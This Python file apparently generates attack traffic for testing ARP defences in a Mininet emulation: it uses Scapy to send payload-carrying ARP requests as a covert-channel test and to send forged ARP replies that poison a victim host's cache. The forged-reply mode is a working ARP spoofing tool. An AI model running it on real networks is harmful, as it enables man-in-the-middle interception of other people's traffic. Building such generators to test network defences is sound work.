#!/usr/bin/env python3
"""Packet generators for the ARP tests (run inside a Mininet host).

covert : broadcast ARP requests carrying a payload after the ARP header
         (the covert-channel attack a reviewer described against the old flood rule)
poison : forged ARP replies (arpspoof-equivalent) from an attacker host
"""
import argparse
import time

from scapy.all import ARP, Ether, Raw, conf, sendp

conf.verb = 0

p = argparse.ArgumentParser()
sub = p.add_subparsers(dest="cmd", required=True)

c = sub.add_parser("covert")
c.add_argument("--iface", required=True)
c.add_argument("--src-mac", required=True)
c.add_argument("--src-ip", required=True)
c.add_argument("--target-ip", required=True)
c.add_argument("--count", type=int, default=50)

q = sub.add_parser("poison")
q.add_argument("--iface", required=True)
q.add_argument("--attacker-mac", required=True)
q.add_argument("--victim-ip", required=True)
q.add_argument("--victim-mac", required=True)
q.add_argument("--spoof-ip", required=True)
q.add_argument("--count", type=int, default=20)
q.add_argument("--interval", type=float, default=0.5)

a = p.parse_args()

if a.cmd == "covert":
    for i in range(a.count):
        pkt = (Ether(src=a.src_mac, dst="ff:ff:ff:ff:ff:ff")
               / ARP(op=1, hwsrc=a.src_mac, psrc=a.src_ip, pdst=a.target_ip)
               / Raw(load=f"COVERT-CHANNEL-{i:04d}".encode()))
        sendp(pkt, iface=a.iface)
        time.sleep(0.02)
    print(f"covert: sent {a.count} payload-carrying ARP requests to {a.target_ip}")
else:
    for _ in range(a.count):
        pkt = (Ether(src=a.attacker_mac, dst=a.victim_mac)
               / ARP(op=2, hwsrc=a.attacker_mac, psrc=a.spoof_ip,
                     hwdst=a.victim_mac, pdst=a.victim_ip))
        sendp(pkt, iface=a.iface)
        time.sleep(a.interval)
    print(f"poison: sent {a.count} forged replies ({a.spoof_ip} is-at {a.attacker_mac}) to {a.victim_ip}")
